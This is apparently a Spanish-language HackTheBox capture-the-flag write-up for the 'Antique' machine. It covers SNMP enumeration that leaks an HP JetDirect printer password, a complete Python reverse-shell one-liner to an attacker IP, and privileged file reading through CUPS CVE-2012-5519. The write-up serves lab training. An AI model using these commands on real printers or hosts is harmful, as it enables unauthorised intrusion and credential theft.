---
title: Antique | Linux
published: 2025-03-21
image: "./logo.png"
tags: [Easy, SNMP Enum, Netowrk Printer Abuse, CVE-2012-5519, eJPT ]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- SNMP Enumeration
- Network Printer Abuse
- CVE-2012-5519

### Preparación

- eJPT

***

## Reconocimiento

Para comenzar usaremos el comando **scan**, para ver que puertos abiertos tiene la máquina:

```sh
scan () {
	sudo nmap -sS --min-rate=5000 -p- --open -vvv -n -Pn "$1" -oG "nmap/AllPorts"
}
```

Nos devuelve lo siguiente:

```
PORT   STATE SERVICE REASON
23/tcp open  telnet  syn-ack ttl 63
```

### Telnet

Solo vemos el puerto **23** que corresponde al servicio **telnet**. Vamos a conectarnos con el comando:

```
telnet 10.10.11.107
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FChMY3zAAwsvvi4yQsLd3%2F1.png?alt=media&#x26;token=13b3bc90-ed0c-49ed-be65-56b887e6d836" alt=""><figcaption></figcaption></figure>

Vemos que es un **HP JetDirect** que buscando en google es un servidor de impresión. Vamos ahora a hacer un escaneo **UDP** en vez de **TCP**.

```
sudo nmap -sU --top-ports 10 -sV 10.10.11.107
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FzjCwxsrq4nxhKp4HUAQd%2F2.png?alt=media&#x26;token=61463237-6cc4-4776-b394-08a0d99c2187" alt=""><figcaption></figcaption></figure>

## Explotación

Buscando información sobre el servicio **SNMP** en **HP JetDirect**, podemos ver un problema de seguridad grave en este artículo ([https://www.exploit-db.com/exploits/22319](https://www.exploit-db.com/exploits/22319)). Añadiremos el dominio `antique.htb` a `/etc/hosts`, y ejecutamos el siguiente comando:

```sh
snmpwalk -v 2c -c public antique.htb .1.3.6.1.4.1.11.2.3.9.1.1.13.0
```

```sh
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```

La vulnerabilidad habla de que si decodificamos esos bits que nos devuelve es bastante probable que encontremos la contraseña de la impresora. Esto se debe a un fallo de seguridad que filtra la contraseña en algunas circunstancias. Lo decodificaremos con la herramienta **xxd** que se usa especialmente en hexadecimal:

```sh
echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 \106 111 114 115 119 122 123 126 130 131 134 135" | xxd -r -p
```

```
P@ssw0rd@123!!123q"2Rbs3CSs$4EuWGW(8i	IYaA"1&1A5%
```

Podríamos intentar a loguearnos con `P@ssw0rd@123!!123`&#x20;

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FFrl82by8JUJiW2SXcPIO%2F3.png?alt=media&#x26;token=4227459d-3824-47e1-bb7c-007b83fadd85" alt=""><figcaption></figcaption></figure>

Una vez teniendo esto podemos intentar entablar una reverse shell a nuestra máquina para mayor comodidad. Haremos una con **python3** con el siguiente comando:

```sh
exec python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.16",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FH0U2n0FX9hFJENBwbLBq%2F4.png?alt=media&#x26;token=0a8d8b39-5efa-416c-a1ba-0c7d280f5736" alt=""><figcaption></figcaption></figure>

## Escalada de privilegios

Para comenzar, veremos que puertos abiertos hay en el sistema, usaremos el comando **ss**. A continuación una explicación de este comando y los parámetros que usaremos.

El comando `ss` en Linux se utiliza para mostrar información sobre las conexiones de red y los sockets en uso en el sistema. Es una alternativa más rápida y eficiente que `netstat`.

El parámetro `-tulpn` tiene el siguiente significado:

* `-t` → Muestra solo sockets TCP.
* `-u` → Muestra solo sockets UDP.
* `-l` → Muestra solo sockets en estado de escucha (listening).
* `-p` → Muestra el proceso que está usando el socket.
* `-n` → Muestra las direcciones y puertos en formato numérico (sin resolver nombres de dominio).

```
ss -tulpn
```

```
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   Process                                                                         
udp     UNCONN   0        0                0.0.0.0:161           0.0.0.0:*                                                                                      
tcp     LISTEN   0        128              0.0.0.0:23            0.0.0.0:*       users:(("python3",pid=1039,fd=3))                                              
tcp     LISTEN   0        4096           127.0.0.1:631           0.0.0.0:*                                                                                      
tcp     LISTEN   0        4096               [::1]:631              [::]:*                                                                                      
```

Podemos ver el puerto **631**, vamos a hacer un curl desde la máquina comprometida a ver que podemos encontrar.

```
curl http://127.0.0.1:631
```

```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML>
<HEAD>
	<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
	<TITLE>Home - CUPS 1.6.1</TITLE>
	<LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css">
	<LINK REL="SHORTCUT ICON" HREF="/images/cups-icon.png" TYPE="image/png">
</HEAD>...
```

### Cups (CVE-2012-5519)

Vemos que está corriento **Cups**, podemos buscar vulnerabilidades para dicha versión la **1.6.1**. Buscando en internet encontramos un exploit que permite la lectura de archivos con privilegios. ([https://github.com/p1ckzi/CVE-2012-5519](https://github.com/p1ckzi/CVE-2012-5519)).

Si la ejecutamos en la máquina víctima podremos leer `/root/root.txt`.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FwWQREzazKRfy273B2vkl%2F5.png?alt=media&#x26;token=30354c02-4038-4a37-85a5-c8c031be65f4" alt=""><figcaption></figcaption></figure>

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/400)

---